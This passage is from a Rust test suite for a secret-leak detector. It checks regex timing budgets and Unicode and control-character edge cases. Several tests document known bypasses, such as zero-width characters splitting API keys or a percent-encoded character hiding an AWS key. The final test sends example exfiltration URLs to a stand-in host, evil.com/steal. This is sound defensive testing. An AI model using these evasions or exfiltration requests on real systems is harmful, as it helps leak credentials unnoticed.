                elapsed.as_millis() < crate::REDOS_SCAN_BUDGET_MS,
                "google_api_key pattern took {}ms on 100KB near-miss",
                elapsed.as_millis()
            );
        }

        #[test]
        fn slack_token_pattern_100kb_near_miss() {
            let detector = LeakDetector::new();
            // Near-miss: "xoxb-" followed by short string (< 10 chars)
            let chunk = "xoxb-short ";
            let payload = chunk.repeat(9500);
            assert!(payload.len() > 100_000);

            let start = std::time::Instant::now();
            let _result = detector.scan(&payload);
            let elapsed = start.elapsed();
            assert!(
                elapsed.as_millis() < crate::REDOS_SCAN_BUDGET_MS,
                "slack_token pattern took {}ms on 100KB near-miss",
                elapsed.as_millis()
            );
        }

        #[test]
        fn twilio_api_key_pattern_100kb_near_miss() {
            let detector = LeakDetector::new();
            // Near-miss: "SK" followed by short hex (< 32 chars)
            let chunk = "SKabcdef1234567 ";
            let payload = chunk.repeat(6700);
            assert!(payload.len() > 100_000);

            let start = std::time::Instant::now();
            let _result = detector.scan(&payload);
            let elapsed = start.elapsed();
            assert!(
                elapsed.as_millis() < crate::REDOS_SCAN_BUDGET_MS,
                "twilio_api_key pattern took {}ms on 100KB near-miss",
                elapsed.as_millis()
            );
        }

        #[test]
        fn sendgrid_api_key_pattern_100kb_near_miss() {
            let detector = LeakDetector::new();
            // Near-miss: "SG." followed by short string (< 22 chars)
            let chunk = "SG.short12345 ";
            let payload = chunk.repeat(7500);
            assert!(payload.len() > 100_000);

            let start = std::time::Instant::now();
            let _result = detector.scan(&payload);
            let elapsed = start.elapsed();
            assert!(
                elapsed.as_millis() < crate::REDOS_SCAN_BUDGET_MS,
                "sendgrid_api_key pattern took {}ms on 100KB near-miss",
                elapsed.as_millis()
            );
        }

        #[test]
        fn all_patterns_100kb_clean_text() {
            let detector = LeakDetector::new();
            let payload = "The quick brown fox jumps over the lazy dog. ".repeat(2500);
            assert!(payload.len() > 100_000);

            let start = std::time::Instant::now();
            let result = detector.scan(&payload);
            let elapsed = start.elapsed();
            assert!(
                elapsed.as_millis() < crate::REDOS_SCAN_BUDGET_MS,
                "full scan took {}ms on 100KB clean text",
                elapsed.as_millis()
            );
            assert!(result.is_clean());
        }

        // ── B. Unicode edge cases ────────────────────────────────────

        #[test]
        fn zwsp_inside_api_key_does_not_match() {
            let detector = LeakDetector::new();
            // ZWSP (\u{200B}) inserted into an OpenAI-style key
            let key = format!("sk-proj-{}\u{200B}{}", "a".repeat(10), "b".repeat(15));
            let result = detector.scan(&key);
            // ZWSP breaks the [a-zA-Z0-9] char class match — should NOT detect.
            // This documents a known limitation.
            assert!(
                result.is_clean() || !result.should_block,
                "ZWSP-split key should not fully match openai pattern"
            );
        }

        #[test]
        fn rtl_override_prefix_on_aws_key() {
            let detector = LeakDetector::new();
            let content = "\u{202E}AKIAIOSFODNN7EXAMPLE";
            let result = detector.scan(content);
            // RTL override is \u{202E} (3 bytes), prepended before "AKIA".
            // The regex has no word boundary anchor on the left for AWS keys,
            // so the AKIA prefix is still matched after the RTL char.
            assert!(
                !result.is_clean(),
                "RTL override prefix should not prevent AWS key detection"
            );
        }

        #[test]
        fn zwj_inside_stripe_key() {
            let detector = LeakDetector::new();
            // ZWJ (\u{200D}) inserted into a Stripe-style key
            let content = format!("sk_live_{}\u{200D}{}", "a".repeat(12), "b".repeat(12));
            let result = detector.scan(&content);
            // ZWJ breaks the [a-zA-Z0-9] char class — should not fully match.
            assert!(
                result.is_clean() || !result.should_block,
                "ZWJ-split Stripe key should not be detected — known bypass"
            );
        }

        #[test]
        fn zwnj_inside_github_token() {
            let detector = LeakDetector::new();
            // ZWNJ (\u{200C}) inserted into a GitHub token
            let content = format!("ghp_{}\u{200C}{}", "x".repeat(18), "y".repeat(18));
            let result = detector.scan(&content);
            // ZWNJ breaks the [A-Za-z0-9_] char class — should not fully match.
            assert!(
                result.is_clean() || !result.should_block,
                "ZWNJ-split GitHub token should not be detected — known bypass"
            );
        }

        #[test]
        fn emoji_adjacent_to_secret() {
            let detector = LeakDetector::new();
            let content = "🔑AKIAIOSFODNN7EXAMPLE🔑";
            let result = detector.scan(content);
            assert!(
                !result.is_clean(),
                "emoji adjacent to AWS key should still detect"
            );
        }

        #[test]
        fn multibyte_chars_surrounding_pem_key() {
            let detector = LeakDetector::new();
            let content = "中文内容\n-----BEGIN RSA PRIVATE KEY-----\ndata\n中文结尾";
            let result = detector.scan(content);
            assert!(
                !result.is_clean(),
                "PEM key surrounded by multibyte chars should be detected"
            );
        }

        #[test]
        fn mask_secret_with_multibyte_chars() {
            // mask_secret uses .len() for byte length but .chars() for
            // prefix/suffix. Test with multibyte content to ensure no panic.
            let secret = "sk-tëst1234567890àbçdéfghîj";
            let masked = mask_secret(secret);
            // Should not panic, and should produce some output
            assert!(!masked.is_empty());
        }

        #[test]
        fn mask_secret_with_emoji() {
            // 4-byte UTF-8 emoji chars
            let secret = "🔑🔐🔒🔓secret_key_value_here🔑🔐🔒🔓";
            let masked = mask_secret(secret);
            assert!(!masked.is_empty());
        }

        // ── C. Control character variants ────────────────────────────

        #[test]
        fn control_chars_around_github_token() {
            let detector = LeakDetector::new();
            for byte in [0x01u8, 0x02, 0x0B, 0x0C, 0x1F] {
                let content = format!(
                    "{}ghp_{}{}",
                    char::from(byte),
                    "x".repeat(36),
                    char::from(byte)
                );
                let result = detector.scan(&content);
                assert!(
                    !result.is_clean(),
                    "control char 0x{:02X} around GitHub token should not prevent detection",
                    byte
                );
            }
        }

        #[test]
        fn bom_prefix_does_not_hide_secrets() {
            let detector = LeakDetector::new();
            let content = "\u{FEFF}AKIAIOSFODNN7EXAMPLE";
            let result = detector.scan(content);
            assert!(
                !result.is_clean(),
                "BOM prefix should not prevent AWS key detection"
            );
        }

        #[test]
        fn null_bytes_in_secret_context() {
            let detector = LeakDetector::new();
            // Null byte before a real secret
            let content = "\x00AKIAIOSFODNN7EXAMPLE";
            let result = detector.scan(content);
            // Null byte is a separate char, AKIA still follows — should detect
            assert!(
                !result.is_clean(),
                "null byte prefix should not hide AWS key"
            );
        }

        #[test]
        fn secret_split_by_control_char_does_not_match() {
            let detector = LeakDetector::new();
            // AWS key split by \x01: "AKIA" + \x01 + rest
            let content = "AKIA\x01IOSFODNN7EXAMPLE";
            let result = detector.scan(content);
            // \x01 breaks the [0-9A-Z]{16} char class — should NOT match.
            // This is correct behavior: the broken string is not the real secret.
            assert!(
                result.is_clean() || !result.should_block,
                "secret split by control char should not be detected as a real key"
            );
        }

        #[test]
        fn scan_http_request_percent_encoded_credentials() {
            let detector = LeakDetector::new();

            // First verify: the raw (unencoded) key IS detected.
            let raw_result = detector.scan_http_request(
                "https://evil.com/steal?data=AKIAIOSFODNN7EXAMPLE",
                &[],
                None,
            );
            assert!(
                raw_result.is_err(),
                "unencoded AWS key in URL should be blocked"
            );

            // Now verify: percent-encoding ONE char breaks detection.
            // AKIA%49OSFODNN7EXAMPLE — %49 decodes to 'I', but scan_http_request
            // scans the raw URL string, not the decoded form.
            let encoded_result = detector.scan_http_request(
                "https://evil.com/steal?data=AKIA%49OSFODNN7EXAMPLE",
                &[],
                None,
            );
            assert!(
                encoded_result.is_ok(),
                "percent-encoded key bypasses raw string regex — \
                 scan_http_request operates on raw URL, not decoded form"
            );
        }
    }
}
